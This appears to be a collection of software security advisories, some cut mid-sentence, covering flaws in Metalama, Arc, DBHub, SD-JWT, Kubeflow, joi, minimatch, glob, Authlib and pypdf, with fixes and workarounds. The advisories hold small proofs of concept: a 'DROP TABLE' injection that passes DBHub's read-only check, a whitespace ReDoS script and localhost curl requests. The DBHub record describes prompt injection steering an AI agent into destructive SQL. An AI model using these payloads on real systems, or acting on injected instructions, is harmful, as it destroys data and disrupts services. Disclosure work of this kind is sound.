**MessagePack era — Metalama 2026.1.0 through 2026.1.18.** The 2026.1 line migrated the pipe serialization to MessagePack (PR #1299, commit `117b607805`, 2026-01-29), using **typeless** MessagePack (`TypelessObjectResolver`), which likewise embeds CLR type names on the wire and instantiates arbitrary types on receipt — again with no allow-list.

Both mechanisms share the same channel, the same predictable pipe name, the same impact, and the same access preconditions.

## Impact

Potential arbitrary code execution inside the Visual Studio process that hosts the affected component (the UI process, the code-analysis process, or the CodeLens process), with full loss of confidentiality, integrity and availability within that process.

**Mitigating factor (limits practical severity to Medium):** the pipe is created with the default Windows ACL (no explicit `PipeSecurity`), which permits **only same-user processes to write**. All of the Visual Studio processes involved run as the same logged-in developer, so exploitation requires the attacker to already be executing code as that same user. There is **no privilege escalation** and no crossing of a security boundary; the practical value is code execution inside the developer's Visual Studio session (lateral movement / persistence within an already same-user-compromised context). This is why the practical severity is **Medium** despite the CVSS base score.

## Severity

CVSS v3.1: `AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H` = **7.3 (High)** base score; **practical severity Medium**, because the attacker gains no privilege beyond what they already had (same user, same Visual Studio session).

CVSS v4.0 cross-check: `CVSS:4.0/AV:L/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` = 7.0 (High). The Subsequent-System metrics are None because no security boundary is crossed.

## Affected products and remediation

All affected products are part of the Visual Studio integration.

| Product | Affected | Remediation |
|---|---|---|
| NuGet `Metalama.Framework` | all `< 2026.1.19` | upgrade to **2026.1.19** (no backports) |
| VS extension `PostSharpTechnologies.PostSharp` ("Metalama + PostSharp", ma

## Summary

Arc exposes `GET /api/v1/logs` without authentication even when authentication is enabled by default. The route is registered before the global Fiber authentication middleware, and the handler returns recent buffered application logs without performing its own authorization check.

## Details

Arc applies the global auth middleware after calling `server.RegisterRoutes()`:

- `cmd/arc/main.go:1598-1599` registers base routes via `server.RegisterRoutes()`.
- `cmd/arc/main.go:1601-1618` configures and installs `auth.NewMiddleware(...)` later.

`server.RegisterRoutes()` registers `GET /api/v1/logs` as a base route:

- `internal/api/server.go:164-183` registers base health, metrics, and logs routes, including `s.app.Get("/api/v1/logs", s.logsHandler)`.

The logs handler returns buffered logs without checking authentication or authorization:

- `internal/api/server.go:537-567` parses `limit`, `level`, and `since_minutes`, reads `logger.GetBuffer().GetRecent(...)`, and returns JSON.
- `internal/logger/buffer.go:9-16` defines log entries returned to callers: timestamp, level, component, message, and caller.
- `internal/logger/buffer.go:33-39` creates a global log buffer holding the last 10,000 entries.
- `internal/api/server.go:540-558` permits up to `limit=1000` and `since_minutes=1440` in one unauthenticated request.

Authentication is enabled by default and `/api/v1/logs` is not listed as a public route:

- `internal/config/config.go:841-843` defaults auth to enabled.
- `internal/auth/middleware.go:29-41` public defaults are `/health`, `/ready`, `/api/v1/auth/verify`, and `/metrics` prefix; `/api/v1/logs` is not public.

However, Fiber route/middleware order makes the later middleware ineffective for an earlier exact route. Local verification against Fiber v2.52.13 showed a route registered before `app.Use(...)` returns `200` and the later middleware is not reached. Fiber’s router walks routes in declaration order and stops after the first matching route unless the handler calls `c.Next()`; `logsHandler` does not call `c.Next()`.

## Proof of concept

Safe local reproduction only; do not scan external infrastructure.

1. Start Arc with default authentication enabled.
2. Request logs without an `Authorization` header or `x-api-key` header:

```bash
curl -i 'http://127.0.0.1:8000/api/v1/logs?limit=1000&since_minutes=1440'
```

Expected vulnerable result:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"timestamp":"...","count":...,"logs":[...]}
```

3. Compare with a protected endpoint without credentials:

```bash
curl -i 'http://127.0.0.1:8000/api/v1/auth/tokens'
```

Expected protected result:

```http
HTTP/1.1 401 Unauthorized
```

This demonstrates that default auth is active while `/api/v1/logs` bypasses it due to registration order.

## Impact

An unauthenticated network attacker can retrieve recent application logs. Depending on deployment and log level, logs can disclose operational metadata such as component names, internal paths, database/measurement names, node identifiers, caller locations, request outcomes, and error details. This can assist further attacks and may expose sensitive data if any deployment logs secrets or user-controlled confidential data.

The audit did not confirm that the bootstrap admin token banner is captured by this endpoint; that banner is printed with `fmt.Fprintf(os.Stderr, ...)`, while this endpoint reads the zerolog-backed application buffer.

## Workarounds

Until patched, operators can restrict access to `/api/v1/logs` at a reverse proxy, firewall, ingress policy, or service mesh. If the endpoint is not needed, block it entirely.

## Suggested fix

- Move `/api/v1/logs` registration after global auth middleware and require an authenticated administrator; or
- Add explicit route-level middleware: `auth.RequireAdmin(authManager)` for `/api/v1/logs`; and
- Add a regression test that unauthenticated requests to `/api/v1/logs` return 401/403 while `/health` and `/ready` rema

The read-only mode can be bypassed on the MySQL and MariaDB connectors. In read-only mode a caller can still execute arbitrary write and DDL statements (for example DROP TABLE), which defeats the protection that read-only mode is meant to provide when a database is exposed to an AI agent.

Root cause

The problem is a mismatch between how DBHub's SQL parser handles single-line comments and how MySQL and MariaDB actually parse them.

In src/utils/sql-parser.ts, scanSingleLineComment treats "--" as the start of a comment no matter what character follows it. MySQL and MariaDB only begin a "--" comment when the two dashes are followed by whitespace, a control character, or the end of the line. Otherwise the dashes are read as two minus signs and the rest of the line is ordinary SQL.

The read-only check in src/tools/execute-sql.ts splits the input and validates each statement with isReadOnlySQL, but the connector then executes the original, unmodified string. The MySQL and MariaDB connectors open their connection pool with multipleStatements: true (src/connectors/mysql/index.ts:54 and src/connectors/mariadb/index.ts:53) and run the whole string in a single call.

Because of this, the following payload:

    SELECT 1--1;DROP TABLE victim

is seen by DBHub as a single SELECT statement, since everything after "--" is treated as a comment and the read-only check passes. MySQL and MariaDB instead parse it as "SELECT 1 - -1" followed by "DROP TABLE victim" and execute both statements.

Proof of concept

1) DBHub's own parser. Running splitSQLStatements and isReadOnlySQL from this repository on the payload returns a single statement and readOnly = true, so the query is allowed in read-only mode. The same code correctly rejects "SELECT 1; DROP TABLE victim", which confirms that the "--1" is what gets through.

2) Execution. Connecting to MariaDB 11.4 with mysql2 and multipleStatements: true (the same option the connector uses) and sending the payload returns 2 for the first statement, which confirms "--" was not treated as a comment, and then drops the table. The table exists before the call and is gone afterwards.

Impact

Read-only mode is the control operators rely on to let an assistant read from a database without being able to change it. With this bypass, anyone who can influence the SQL the assistant sends, most realistically through prompt injection in content the assistant reads, can perform writes and destructive DDL against MySQL and MariaDB. PostgreSQL is not affected by this path, because it treats "--" as a comment regardless and executes each split statement individually.

Affected code (current main, commit e99c3aa9, package version 0.22.3)

- src/utils/sql-parser.ts — scanSingleLineComment does not require whitespace after "--"
- src/tools/execute-sql.ts — validates the split statements but executes the original string
- src/connectors/mysql/index.ts and src/connectors/mariadb/index.ts — multipleStatements: true

Suggested fix

The most reliable fix is to stop executing the original string: run only the statements that were validated, and disable multipleStatements on the MySQL and MariaDB connections unless it is genuinely required. As defense in depth, make the comment scanner dialect-aware so that for MySQL and MariaDB "--" only starts a comment when it is followed by whitespace, a control character, or the end of the line, similar to the handling already in place for MySQL conditional comments.
items.title: DBHub: MySQL and MariaDB comment interpretation bypasses read-only SQL validation

## Summary

When one Disclosure in an SD-JWT presentation is tampered so its digest no longer matches the Issuer-signed `_sd` array, `@sd-jwt/decode` 0.19.0 does **not** reject the presentation. It silently drops the unmatched Disclosure and returns a **reduced claim set**, reporting success. The Issuer signature is untouched and valid.

This is a downgrade/omission primitive. A malicious or curious **holder** can present a tampered Disclosure and have the relying party receive *fewer* claims than the credential carries, with no error surfaced. Where the relying party does **not** enforce key binding, an **in-transit (on-path) attacker** can achieve the same by mangling one Disclosure's bytes; where key binding **is** enforced, on-path tampering instead breaks the holder's KB-JWT `sd_hash` binding (so it is rejected), and the downgrade is then exercisable by the key-bound holder — confirmed end-to-end with KB required.

Two distinct tampering inputs converge on the same silent-drop sink:

1. **Genuinely non-decodable Disclosure** (broken base64url -> bytes that are not valid UTF-8, e.g. an injected `0xF2` lead byte). RFC 9901 §7.1 step 3 / §4.2.1 require rejection. `@sd-jwt/decode` instead **lossy-decodes** it: the `TextDecoder`/`Buffer` path substitutes U+FFFD (REPLACEMENT CHARACTER) for the invalid byte and recovers a syntactically valid disclosure (the `salt` gains a U+FFFD, claim `family_name` = `"Smith"`). The recovered Disclosure then hashes to a digest **absent** from the signed `_sd` array, so it is silently skipped.
2. **Tampered-but-still-valid-JSON Disclosure** (digest no longer matches `_sd`): same end state — the unmatched Disclosure is silently skipped.

Two RFC 9901 MUSTs compound:
- **§7.1 step 5 (primary):** "If any Disclosure was not referenced by digest value in the Issuer-signed JWT (directly or recursively via other Disclosures), the SD-JWT MUST be rejected." — instead silently dropped.
- **§7.1 step 3 / §4.2.1 (secondary):** a non-base64url-JSON Disclosure MUST be rejected — the lenient lossy decode skips this check.

Confirmed end-to-end through `SDJwtInstance.verify()` with a real ES256 issuer key, and again with **key binding REQUIRED** (a valid holder ES256 KB-JWT over `aud`+`nonce`+`sd_hash`).

## Impact

Silent claim-set reduction is a downgrade/omission primitive. If a relying party's authorization logic is "default-allow when a constraining claim is absent" (an age / role / restriction attribute), dropping that one Disclosure flips the decision, with no error surfaced. The decoder reporting **success** on a tampered presentation is the core problem; tampering should be a hard reject. Because SD-JWT VC and the EU EUDIW ARF profiles reuse this disclosure layer, the exposure is to wallet/verifier deployments built on `@sd-jwt/*`.

## Proof of concept (minimized — NOT a weaponized exploit)

A clean single-mutation credential: lowercase `_sd_alg: "sha-256"`, an honest Issuer body whose `_sd` digests are computed over the valid wire Disclosures, and exactly one wire byte-segment tampered — the `family_name` Disclosure made genuinely non-decodable (an invalid-UTF-8 `0xF2` byte injected into its base64url). Everything else is byte-for-byte valid.

The byte-exact credential cannot be faithfully pasted as text (it deliberately contains the invalid `0xF2` byte that triggers the lossy decode). It is provided as `bug3_clean_tampered.cred` with an untampered twin `bug3_clean_control.cred`, plus the minting script `mint_bug3_clean.py` and a three-oracle harness `run_three_oracles.py` — shared privately with the maintainer on first reply. Structure: 5 Disclosures, only index 1 (`family_name`) tampered; all other segments byte-for-byte valid.

Observed on the byte-identical credential (three independent oracles):

| Oracle | Version | Verdict | Detail |
|---|---|---|---|
| RFC 9901 reference (pure Python) | reference impl | **REJECT** | `R_DISCLOSURE_DECODE` |
| `sd-jwt` (Daniel Fett's reference impl) | pip 0.10.4
items.title: SD JWT JS: Tampered disclosures silently dropped instead of rejected

## Summary

The Kubeflow Pipelines API server decompresses uploaded pipeline archives without adequately bounding expanded data in affected versions. A small ZIP or gzip-compressed tar archive can consume disproportionately large amounts of memory while the server locates or reads the pipeline file, potentially exhausting API-server resources and interrupting service.

Multipart pipeline and pipeline-version upload processing decompresses the archive before namespace authorization, so a caller who can reach those endpoints does not need a successful pipeline-create authorization decision to trigger the issue. External authentication and network controls can restrict reachability. URL-import handlers authorize before fetching and decompressing a remote archive.

The amount of expansion needed to exhaust memory depends on deployment resource limits and concurrent activity; no particular archive is guaranteed to crash every deployment.

## Remediation

Upgrade the API server to **[Kubeflow Pipelines 2.18.0](https://github.com/kubeflow/pipelines/releases/tag/2.18.0)**. Versions through 2.17.3 are affected; the first affected release has not been established.

[PR #14171](https://github.com/kubeflow/pipelines/pull/14171) bounds compressed input and extracted pipeline data. [PR #14186](https://github.com/kubeflow/pipelines/pull/14186) strengthens the total tar traversal budget, including metadata and skipped entries. The 2.18 release also includes configurable upload and specification limits; operators should review the shipped settings and resource budget. These controls address pipeline archive amplification and do not establish general HTTP-body, temporary-disk, concurrency, or CPU limits.

Until upgrading, restrict access to upload and import endpoints and apply deployment-level request and resource controls. A compressed upload-size limit alone does not prevent decompression amplification. Regression tests cover compressed input, selected-entry boundaries, and tar traversal budgets; no deployed-server OOM test was performed for this assessment.

## Credit

[bugbunny.ai](https://bugbunny.ai) discovered and reported the issue. Ayush Gupta ([@Ayush-kathil](https://github.com/Ayush-kathil)) authored the archive fixes in #14171 and #14186, with Jeff Spahr ([@jeffspahr](https://github.com/jeffspahr)) contributing regression coverage to #14171.

[@BrianWillows](https://github.com/BrianWillows) later submitted a mixed report that included source analysis of pipeline-archive decompression.
items.title: Kubeflow Pipelines: Pipeline archive upload allows decompression bomb to exhaust server memory

## Summary

The Kubeflow Pipelines API server's `GET /apis/v1alpha1/runs/{run_id}/nodes/{node_id}/log` handler retrieves logs without authorizing the caller against the selected run. A caller who can reach the backend and knows a victim run ID and a suitable pod or node identifier can read live or archived logs using the API server's permissions.

For live logs, the vulnerable handler also accepts the supplied node ID as a pod name in the run's namespace without verifying that the pod belongs to the run. Depending on the API server's pod-log permissions, a known run ID can therefore permit reading the `main` container logs of an unrelated pod in that namespace. Logs may contain sensitive workload data or credentials.

The affected handler does not authenticate the request itself. An external authentication gate or network policy can restrict reachability; public ingress exposure and unauthenticated enumeration of run IDs are not assumed.

## Remediation

Upgrade the API server to **[Kubeflow Pipelines 2.18.0](https://github.com/kubeflow/pipelines/releases/tag/2.18.0)**. Versions through 2.17.3 are affected; the first affected release has not been established.

[PR #13684](https://github.com/kubeflow/pipelines/pull/13684) authorizes the caller with the `readLog` verb before retrieving live or archived logs. For live logs, it also verifies that the pod's `pipeline/runid` label matches the requested run. Custom Kubernetes roles must grant `readLog` on `runs` in the `pipelines.kubeflow.org` API group; the bundled viewer and editor roles include it. Shared read access alone does not grant log access.

Until upgrading, restrict access to the backend log endpoint. Focused regression tests cover authorization denial, HTTP identity propagation, pod/run mismatch, archive retrieval, and cancellation; no new deployed-cluster end-to-end test was performed for this assessment.

## Credit

[bugbunny.ai](https://bugbunny.ai) discovered and reported the issue. Nayyar ([@naruto-lgtm](https://github.com/naruto-lgtm)) authored the fix in #13684.

[@patchmyday](https://github.com/patchmyday), [@thesecguy45](https://github.com/thesecguy45), [@VitoCrl](https://github.com/VitoCrl), [@Grg0rry](https://github.com/Grg0rry), [@arpitjain099](https://github.com/arpitjain099), and [@BrianWillows](https://github.com/BrianWillows) made later submissions concerning the run-log authorization gap. **MUTEDCYBERSECURITY S.L.** separately reported a synthetic two-tenant reproduction, including the unrelated-pod log path.

### Summary

`Joi.string().email({ multiple: true })` takes quadratic time to split a value that contains a long run of whitespace. One request with 100 KB of spaces blocks the Node.js event loop for several seconds, which causes a denial of service.

### Details

When the `multiple` option is set, the `email` rule splits the value into addresses with a regular expression that removes whitespace on each side of the separator:

```js
const regex = new RegExp(`\\s*[${options.separator ? escapeRegex(options.separator) : ','}]\\s*`);
// ...
const emails = options.multiple ? value.split(regex) : [value];
```

`String.prototype.split` tries a match at each position of the value. At each position inside a whitespace run, the leading `\s*` reads the rest of the run, does not find a separator, and backtracks through all of it. A run of `n` whitespace characters without a separator therefore costs `n²` steps. This applies to the default separator and to all custom `separator` values.

The fix lets the leading whitespace match start only at the beginning of a whitespace run, so the split is linear:

```js
const regex = new RegExp(`(?:(?<!\\s)\\s+)?[${options.separator ? escapeRegex(options.separator) : ','}]\\s*`);
```

The split results do not change. The regular expression is now built only when `multiple` is set.

Every `joi` release from `17.1.1` up to and including `17.13.8`, and from `18.0.0` up to and including `18.3.0`, is affected. Every `@hapi/joi` release from `16.0.0` is affected.

Workarounds for users who cannot upgrade:

- Add `.max()` before `.email()`, for example `Joi.string().max(1000).email({ multiple: true })`. The `max` rule then rejects long values before the `email` rule runs.
- Do not use the `abortEarly: false` option with this schema. With `abortEarly: false`, the `email` rule runs even when the `max` rule fails.
- Do not use `.trim()` as a workaround. It removes only the whitespace at the start and at the end of the value.

### Proof of concept

```js
const Joi = require('joi');

const schema = Joi.string().email({ multiple: true });
for (const n of [25000, 50000, 100000, 200000]) {
    const start = Date.now();
    schema.validate(' '.repeat(n));
    console.log(`${n} spaces: ${Date.now() - start} ms`);
}
```

Output on `joi@18.3.0` (Node.js 26):

```text
25000 spaces: 244 ms
50000 spaces: 887 ms
100000 spaces: 3349 ms
200000 spaces: 13579 ms
```

Output on the patched version:

```text
25000 spaces: 0 ms
50000 spaces: 0 ms
100000 spaces: 0 ms
200000 spaces: 1 ms
```

Over HTTP, send the whitespace in a field that the route validates with this schema:

```http
POST /invite HTTP/1.1
Content-Type: application/json

{"emails": "<100000 spaces>"}
```

### Impact

This is a denial of service by CPU exhaustion. It affects each application that validates untrusted input with `Joi.string().email({ multiple: true })` and that has no length limit before the `email` rule. One request with 100 KB of whitespace blocks the Node.js event loop for several seconds, and the server cannot process other requests during that time. The attacker needs no authentication when the route is public, and a small number of concurrent requests can keep the service unavailable.
items.title: joi: quadratic-time split in `string().email({ multiple: true })` allows denial of service

minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.

researcher: Reid Downing (b1nv0id)
files: 

- src/index.ts: 690-770
- src/index.ts: 780-796

issue:
input-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.

the **/../ transformation clones a globparts entry and appends the clone to the same globparts array:
```
parts.splice(gs, 1)
const other = parts.slice(0)
other[gs] = '**'
globParts.push(other)
```
this occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.

the expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:
```
for (let i = 0; i < globParts.length - 1; i++) {
  for (let j = i + 1; j < globParts.length; j++) {
    this.partsMatch(...)
  }
}
```
an attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.
items.title: minimatch has potential denial of service via globparts amplification

### Summary

In glob 13.0.6, an aborted async walk rejects or emits an error but continues recursively reading directories in the background.

The root cause is that abort branches in src/walker.ts call cb() without returning. As a result, callers that rely on signal or AbortSignal.timeout() to bound glob traversal cost can still incur filesystem I/O and CPU work after the request has already been rejected.

### Details

This was reproduced on glob v13.0.6 (commit e80cb38ae60d6cbff9e75f39032a994858994d35).

The README documents that the signal option cancels the glob walk. However, in src/walker.ts, the following methods call cb() when this.signal?.aborted is true but do not return:

- GlobUtil.walkCB()
- GlobUtil.walkCB2()
- GlobUtil.walkCBSync()
- GlobUtil.walkCB2Sync()

Example vulnerable pattern:

if (this.signal?.aborted) cb()

Because execution continues after cb(), the walker still reaches processor.processPatterns(), readdirCB(), and recursive walkCB2() calls.

The issue was directly demonstrated against v13.0.6. A source-history review shows the same missing-return pattern is present in tagged releases from v9.0.0 through v13.0.6.

The issue affects both glob() and globStream().

Recommended fix:
Change each abort branch to return immediately:

if (this.signal?.aborted) return cb()

### Proof of concept

Environment:
- Linux x86_64
- Node.js v22.23.3
- npm 10.9.9
- glob 13.0.6

Reproduction steps:

1. Install the affected package:
   npm init -y
   npm install glob@13.0.6

2. Run the attached PoC:
   node poc/abort-continues-work.mjs

The PoC aborts after the first readdir() call, waits briefly, and counts how many more directory reads happen after the promise has already rejected.

Observed output on the vulnerable version:

{
  "rejection": "Error: probe-abort",
  "readdirCalls": 1365,
  "readdirCallsAtReject": 5,
  "readdirCallsAfterReject": 1360
}

Expected behavior:
readdirCallsAfterReject should be 0.

A second PoC using AbortSignal.timeout() also reproduces the issue:

{
  "rejection": "TimeoutError: The operation was aborted due to timeout",
  "readdirCalls": 133,
  "readdirCallsAtReject": 1,
  "readdirCallsAfterReject": 132
}

The same test against a patched build with return cb() in the four abort branches stops immediately:

{
  "readdirCalls": 1,
  "readdirCallsAtReject": 1,
  "readdirCallsAfterReject": 0
}

### Impact

This is an availability issue.

Applications that expose globbing over attacker-influenced patterns or attacker-controlled directory trees and use AbortSignal / AbortSignal.timeout() as a traversal budget can still perform significant filesystem I/O and CPU work after a request has already timed out or been canceled.

Repeated timed-out requests can stack background glob walks and degrade worker throughput or service availability.

No confidentiality or integrity impact was observed.
items.title: Glob: AbortSignal cancellation bypass allows post-timeout filesystem traversal

## Description

### Summary

RFC 7592 (OAuth 2.0 Dynamic Client Registration Management Protocol) lets a previously registered client read, update, or delete its own registration, authenticated by a `registration_access_token` issued specifically to that client at registration time. The entire security model of this protocol depends on the server verifying that the token presented in the request actually belongs to the client identified in the request, not merely that the token is valid for some client.

Authlib's `ClientConfigurationEndpoint` implements the control flow correctly in structure, calling `authenticate_token`, then `authenticate_client`, then `check_permission`, and treats all three as abstract methods that "Developers MUST implement in subclass." The problem is that the documented example implementations for these methods, taken together exactly as written, never perform the one check that matters: binding the authenticated token to the specific client being accessed. A developer who implements these methods by following the provided examples ends up with a complete authorization bypass on this endpoint.

### Details

`authenticate_client`'s documented example (`authlib/oauth2/rfc7592/endpoint.py`):

```python
def authenticate_client(self, request):
    """Read a client from the request payload.
    Developers MUST implement this method in subclass::

        def authenticate_client(self, request):
            client_id = request.payload.data.get("client_id")
            return Client.get(client_id=client_id)

    :return: client instance
    """
    raise NotImplementedError()
```

This looks the target client up purely by the `client_id` supplied in the request payload, with no reference to the token at all.

`check_permission`'s documented example, in the same file:

```python
def check_permission(self, client, request):
    """Checks whether the current client is allowed to be accessed, edited
    or deleted. Developers MUST implement it in subclass, e.g.::

        def check_permission(self, client, request):
            return client.editable

    :return: boolean
    """
    raise NotImplementedError()
```

This checks a property of the target client alone (whether it is generally "editable"), again with no reference to `request.credential`, the authenticated token object returned earlier by `authenticate_token` and stored on the request specifically so that later steps can check it:

```python
def create_configuration_response(self, request):
    token = self.authenticate_token(request)
    if not token:
        raise AccessDeniedError()

    request.credential = token

    client = self.authenticate_client(request)
    ...
    if not self.check_permission(client, request):
        raise UnauthorizedClientError(...)
```

`request.credential` is set specifically so that a binding check can be performed downstream, but neither documented example ever reads it. Following both examples as written produces an implementation where the only requirements to access, modify, or delete a client's registration are: possessing any valid registration_access_token for any client, and knowing or guessing the target `client_id`.

This is meaningfully different from how the equivalent example is written for the token introspection endpoint (RFC 7662) elsewhere in the same codebase, which does correctly demonstrate checking the authenticated caller's own identity (`authlib/oauth2/rfc7662/introspection.py`):

```python
def check_permission(self, token, client, request):
    """Check if the request has permission to introspect the token. Developers
    MUST implement this method::

        def check_permission(self, token, client, request):
            # only allow a special client to introspect the token
            return client.client_id == "introspection_client"
    """
```

In that endpoint, `client` represents the already-authenticated caller (verified through normal client credential authentication earlier in the flow

### Impact

An attacker who uses this vulnerability can craft a PDF which leads to large runtimes. This requires retrieving the page labels of a file.

### Patches

This has been fixed in [pypdf==6.21.3](https://github.com/py-pdf/pypdf/releases/tag/6.21.3).

### Workarounds

If you cannot upgrade yet, consider applying the changes from PR [#4251](https://github.com/py-pdf/pypdf/pull/4251).
items.title: pypdf has possible long runtimes when retrieving page labels
